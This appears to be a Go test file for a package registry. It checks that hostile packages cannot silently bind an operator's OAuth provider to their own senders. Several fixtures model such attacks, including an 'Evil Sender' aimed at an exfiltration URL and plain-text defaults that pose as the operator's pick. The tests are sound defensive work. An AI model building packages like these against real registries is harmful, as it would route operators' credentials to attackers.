		Name: "TENANT", Type: "string", Required: true, Pick: pickOAuthProvider,
	}}
	forged := *v1
	forgedManifest := *v1.Manifest
	forgedManifest.Variables = v2.Manifest.Variables
	forged.Manifest = &forgedManifest
	update := func(vars, resolutions map[string]string) error {
		ae := NewAuditEvent("Registry.PackageUpdate", h.session)
		_, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetchVersions(v2, &forged), vars, resolutions, nil)
		return err
	}
	overwrite := map[string]string{"apisender:Graph Sender": resolveOverwrite}
	for _, res := range []map[string]string{nil, overwrite} {
		var me ErrMissingVariables
		if err := update(nil, res); !errors.As(err, &me) || len(me.Variables) != 1 || me.Variables[0].Name != "TENANT" {
			t.Fatalf("want the pick asked for, got %v", err)
		}
		if got := h.senderProvider("Graph Sender"); got == nil || *got != *graphID {
			t.Fatal("stopped update changed the binding")
		}
	}

	var ce ErrUpdateConflicts
	if err := update(map[string]string{"TENANT": "Contoso"}, nil); !errors.As(err, &ce) || len(ce.Conflicts) != 1 {
		t.Fatalf("pick chosen: want the rebind conflict, got %v", err)
	}
	if err := update(map[string]string{"TENANT": "Contoso"}, overwrite); err != nil {
		t.Fatalf("overwrite with the pick chosen: %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *contosoID {
		t.Fatal("sender not bound to the pick chosen in this update")
	}
}

// TestOAuthUpdateNewMemberNeedsFreshPick installs a bundle with its own content
// and a member whose sender binds the operator's provider through a pick. An
// update adds a package from another namespace whose sender names a pick of the
// same name. The stored value never binds that sender: the update asks for the
// value and writes nothing, and binds only once the value is given in the update.
// The same holds when the bundle does not share variables.
func TestOAuthUpdateNewMemberNeedsFreshPick(t *testing.T) {
	for _, share := range []bool{true, false} {
		t.Run(map[bool]string{true: "shared", false: "unshared"}[share], func(t *testing.T) {
			h := newForeignKeyRegFixture(t)
			regID := uuid.New()
			mineID := h.operatorProvider("Mine")
			pick := func(required bool) []registry.Variable {
				return []registry.Variable{{
					Name: "PROVIDER", Type: "string", Required: required, Pick: pickOAuthProvider,
				}}
			}
			mem := typedPackage("ns/mem", "apisender", "1.0.0",
				"\napiSenders:"+senderYAML("Mem Sender", "https://graph.example.test/send", "", "{}", "@@PROVIDER@@"), nil)
			mem.Manifest.Variables = pick(true)
			// with sharing off a required value would already be reported missing, so
			// the pick there is optional to reach the pick check itself.
			evil := typedPackage("evil/x", "apisender", "1.0.0",
				"\napiSenders:"+senderYAML("Evil Sender", exfilURL, "", "{}", "@@PROVIDER@@"), nil)
			evil.Manifest.Variables = pick(share)
			kit := func(version string, deps ...string) *registry.VerifiedPackage {
				p := typedPackage("ns/kit", "bundle", version, pageYAML("Kit Page", "kit.html"),
					map[string]string{"kit.html": "<p>kit " + version + "</p>"}, deps...)
				p.Manifest.ShareVariables = &share
				return p
			}
			v1 := kit("1.0.0", "ns/mem")
			ip := h.install(&regID, "ns/kit",
				map[string]string{varKey("ns/mem", "PROVIDER", share): "Mine"}, fetchFrom(v1, mem))
			if got := h.senderProvider("Mem Sender"); got == nil || *got != *mineID {
				t.Fatal("install did not bind the picked provider")
			}

			v2 := kit("1.1.0", "ns/mem", "evil/x")
			fetch := fetchVersions(v1, v2, mem, evil)
			ae := NewAuditEvent("Registry.PackageUpdate", h.session)
			_, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetch, nil, nil, nil)
			var mv ErrMissingVariables
			if !errors.As(err, &mv) {
				t.Fatalf("want missing variables, got %v", err)
			}
			wantKey := varKey("evil/x", "PROVIDER", share)
			if len(mv.Variables) != 1 || mv.Variables[0].Key != wantKey ||
				mv.Variables[0].Pick != pickOAuthProvider || (mv.Variables[0].Scope != "") != !share {
				t.Fatalf("missing = %+v, want the pick under %q", mv.Variables, wantKey)
			}
			if h.senderCount() != 1 || h.isInstalled(&regID, "evil/x") {
				t.Fatal("refused update wrote the new member")
			}

			ae = NewAuditEvent("Registry.PackageUpdate", h.session)
			vars := map[string]string{wantKey: "Mine"}
			if _, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetch, vars, nil, nil); err != nil {
				t.Fatalf("update with the value given: %v", err)
			}
			if got := h.senderProvider("Evil Sender"); got == nil || *got != *mineID {
				t.Fatal("new member sender not bound to the provider given in the update")
			}
		})
	}
}

// TestOAuthUpdateRecordedPlainAsksAgain installs a package whose sender binds
// the operator's pick, then changes the install record so the variable reads as
// plain text. The update asks for the pick again even though every version of
// the package declares it as a pick, and binds nothing until it is given.
func TestOAuthUpdateRecordedPlainAsksAgain(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	mineID := h.operatorProvider("Mine")
	graph := senderYAML("Graph Sender", "https://graph.example.test/send", "", "{}", "@@PROVIDER@@")
	v1 := pickSenderPackage("1.0.0", graph)
	ip := h.install(&regID, "ns/pick", map[string]string{"PROVIDER": "Mine"}, fetchFrom(v1))
	if !installedOAuthPicks(ip)["PROVIDER"] {
		t.Fatalf("install did not record the pick, got %q", ip.OAuthPicks)
	}
	if err := h.s.RegistryRepository.SetInstalledOAuthPicks(h.ctx, ip.ID, "[]"); err != nil {
		t.Fatalf("record: %v", err)
	}
	ip = h.installed(&regID, "ns/pick")

	v2 := pickSenderPackage("1.1.0", strings.ReplaceAll(graph, "202", "200"))
	ae := NewAuditEvent("Registry.PackageUpdate", h.session)
	_, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetchVersions(v2, v1), nil, nil, nil)
	var me ErrMissingVariables
	if !errors.As(err, &me) || len(me.Variables) != 1 || me.Variables[0].Name != "PROVIDER" {
		t.Fatalf("want the pick asked again, got %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *mineID {
		t.Fatal("stopped update changed the binding")
	}

	ae = NewAuditEvent("Registry.PackageUpdate", h.session)
	vars := map[string]string{"PROVIDER": "Mine"}
	if _, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetchVersions(v2, v1), vars, nil, nil); err != nil {
		t.Fatalf("update with the pick chosen again: %v", err)
	}
	if !installedOAuthPicks(h.installed(&regID, "ns/pick"))["PROVIDER"] {
		t.Fatal("update did not record the pick chosen again")
	}
}

func isSharedPickErr(err error) bool {
	return err != nil && strings.Contains(err.Error(), `declare the shared variable "PROV" differently`)
}

// TestOAuthSharedPlainDefaultIsNoPick installs a bundle whose own PROV is plain
// text with a default naming the operator's provider, next to a member that
// declares PROV as an OAuth provider pick for its sender. One value would fill
// both, so the plain default would count as the operator's pick. The install is
// refused before any write, and so is an update that adds such a member. A member
// declaring PROV as a pick of another kind is refused the same way.
func TestOAuthSharedPlainDefaultIsNoPick(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	h.operatorProvider("Prod")
	prod := "Prod"
	kit := func(version string, deps ...string) *registry.VerifiedPackage {
		p := typedPackage("evil/kit", "bundle", version, pageYAML("Kit Page", "kit.html"),
			map[string]string{"kit.html": "<p>kit " + version + "</p>"}, deps...)
		p.Manifest.Variables = []registry.Variable{{Name: "PROV", Type: "string", Default: &prod}}
		return p
	}
	send := func(pick string) *registry.VerifiedPackage {
		p := typedPackage("evil/send", "apisender", "1.0.0", graphSenderYAML("@@PROV@@"), nil)
		p.Manifest.Variables = []registry.Variable{{Name: "PROV", Type: "string", Pick: pick}}
		return p
	}
	v1 := kit("1.0.0", "evil/send")
	for _, vars := range []map[string]string{nil, {"PROV": "Prod"}} {
		_, err := h.s.planInstall(h.ctx, &regID, "evil", "kit", vars, nil, fetchFrom(v1, send(pickOAuthProvider)))
		if !isSharedPickErr(err) {
			t.Fatalf("install with %v: want the shared pick refusal, got %v", vars, err)
		}
	}
	_, err := h.s.planInstall(h.ctx, &regID, "evil", "kit", nil, nil, fetchFrom(v1, send("smtpConfiguration")))
	if !isSharedPickErr(err) {
		t.Fatalf("pick of another kind: want the shared pick refusal, got %v", err)
	}
	if n := h.senderCount(); n != 0 || h.isInstalled(&regID, "evil/kit") {
		t.Fatal("refused install wrote something")
	}

	ip := h.install(&regID, "evil/kit", nil, fetchFrom(kit("1.0.0")))
	v2 := kit("1.1.0", "evil/send")
	for _, vars := range []map[string]string{nil, {"PROV": "Prod"}} {
		ae := NewAuditEvent("Registry.PackageUpdate", h.session)
		_, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetchFrom(v2, send(pickOAuthProvider)), vars, nil, nil)
		if !isSharedPickErr(err) {
			t.Fatalf("update with %v: want the shared pick refusal, got %v", vars, err)
		}
	}
	if n := h.senderCount(); n != 0 || h.isInstalled(&regID, "evil/send") {
		t.Fatal("refused update wrote the new member")
	}
	if got := h.installed(&regID, "evil/kit").Version; got != "1.0.0" {
		t.Fatalf("refused update moved the bundle to %s", got)
	}
}

// TestOAuthSharedPickSameKindBinds installs a bundle and a member that both
// declare PROV as an OAuth provider pick. The operator's choice binds the member
// sender.
func TestOAuthSharedPickSameKindBinds(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	mineID := h.operatorProvider("Mine")
	pick := []registry.Variable{{Name: "PROV", Type: "string", Required: true, Pick: pickOAuthProvider}}
	kit := typedPackage("ns/kit", "bundle", "1.0.0", pageYAML("Kit Page", "kit.html"),
		map[string]string{"kit.html": "<p>kit</p>"}, "ns/send")
	kit.Manifest.Variables = pick
	send := typedPackage("ns/send", "apisender", "1.0.0", graphSenderYAML("@@PROV@@"), nil)
	send.Manifest.Variables = pick
	h.install(&regID, "ns/kit", map[string]string{"PROV": "Mine"}, fetchFrom(kit, send))
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *mineID {
		t.Fatal("shared pick did not bind the member sender")
	}
}

// TestOAuthPickDuplicateVariableRefused serves a package that declares PROV as
// an OAuth provider pick and again as plain text with a default naming the
// operator's provider. The manifest check refuses it, so nothing is installed.
func TestOAuthPickDuplicateVariableRefused(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	h.operatorProvider("Prod")
	prod := "Prod"
	srv := fakeRegistry(t, map[string]fakeArchive{
		"evil/send": buildFakeArchiveVars(t, "evil/send", "apisender", nil, []registry.Variable{
			{Name: "PROV", Type: "string", Pick: pickOAuthProvider},
			{Name: "PROV", Type: "string", Default: &prod},
		}, map[string]string{"content/send/data.yaml": graphSenderYAML("@@PROV@@")}),
	})
	regID, err := h.s.RegistryRepository.InsertRegistry(
		h.ctx, &database.Registry{Name: "fake", URL: srv.URL, InsecureTLS: true},
	)
	if err != nil {
		t.Fatalf("insert registry: %v", err)
	}
	for _, vars := range []map[string]string{nil, {"PROV": "Prod"}} {
		_, err = h.s.Install(h.ctx, h.session, regID, "evil", "send", vars, nil)
		if err == nil || !strings.Contains(err.Error(), `declares the variable "PROV" more than once`) {
			t.Fatalf("install with %v: want the duplicate variable refusal, got %v", vars, err)
		}
	}
	if n := h.senderCount(); n != 0 || h.isInstalled(regID, "evil/send") {
		t.Fatal("refused install wrote something")
	}
}
